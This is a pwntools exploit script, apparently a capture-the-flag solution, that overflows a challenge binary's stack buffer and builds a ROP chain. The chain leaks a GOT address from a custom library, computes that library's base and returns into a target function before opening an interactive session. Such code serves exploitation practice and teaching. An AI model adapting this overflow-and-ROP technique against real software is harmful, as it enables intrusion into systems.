#!/usr/bin/env python3
from pwn import *

exe = './chall'

elf = context.binary = ELF(exe)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())



### helper ###


#### Exploit starts here ####

io = start()

custom = ELF('./zerodays.so')

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
main = elf.symbols['main']
got_puts = elf.symbols.got['jack']
puts = elf.symbols['puts']


payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(puts)
payload += p64(main)


io.sendlineafter(b'Input:',payload)

leak = io.recvlines(2)[1].strip().ljust(8,b'\x00')
leak = u64(leak)
print(hex(leak))

custom_base = leak - custom.symbols.jack

log.info(hex(custom_base))
ted = custom_base+custom.symbols.ted
log.info(f"ted @ {hex(ted)}")

payload2 = b'A' * 72
payload2 += p64(ret)
payload2 += p64(ted)

io.sendlineafter(b'Input:',payload2)


io.interactive()
